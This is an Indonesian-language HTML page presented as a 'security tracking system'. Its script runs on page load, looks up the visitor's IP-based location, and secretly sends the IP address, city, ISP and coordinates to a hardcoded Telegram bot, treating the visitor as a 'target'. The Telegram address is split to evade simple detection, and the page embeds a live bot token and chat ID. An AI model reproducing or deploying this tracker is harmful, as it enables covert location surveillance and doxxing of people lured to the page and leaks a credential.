<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Pelacakan Keamanan</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
        .info-box { padding: 20px; text-align: center; background: rgba(0,20,0,0.9); border-bottom: 2px solid #0f0; }
        #map-container { width: 100%; height: 80vh; border: none; }
        .blink { animation: blinker 1s linear infinite; color: red; font-weight: bold; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>

    <div class="info-box">
        <div class="blink">‚ö†Ô∏è PERINGATAN: KONEKSI TERDETEKSI ‚ö†Ô∏è</div>
        <div id="status">Sedang memetakan koordinat perangkat...</div>
    </div>

    <iframe id="map-container" src=""></iframe>

    <script>
        // --- KONFIGURASI TELEGRAM ---
        const _token = '8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo';
        const _chatId = '8551809114';
        // ----------------------------

        async function startTracking() {
            try {
                // 1. Ambil data lokasi via IP
                const response = await fetch('https://ipapi.co/json/');
                const d = await response.json();

                const lat = d.latitude;
                const lon = d.longitude;
                const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}&z=15&output=embed`;

                // 2. Tampilkan Maps di Iframe (Langsung Muncul di Web)
                document.getElementById('map-container').src = mapsUrl;
                document.getElementById('status').innerText = `Lokasi Terkunci: ${d.city}, ${d.country_name}`;

                // 3. Kirim data lengkap ke Telegram lo
                const pesan = `
üìç **TARGET TERKUNCI!**
------------------------------
üåê IP: ${d.ip}
üèôÔ∏è Kota: ${d.city}
üè¢ ISP: ${d.org}
üìç Koordinat: ${lat}, ${lon}
------------------------------
üîó Link Maps: https://www.google.com/maps?q=${lat},${lon}
                `;

                await fetch(`https://api.tele` + `gram.org/bot${_token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: _chatId, text: pesan, parse_mode: 'Markdown' })
                });

            } catch (err) {
                document.getElementById('status').innerText = "Gagal memuat peta. Koneksi tidak stabil.";
            }
        }

        // Jalankan saat web dibuka
        window.onload = startTracking;
    </script>
</body>
</html>
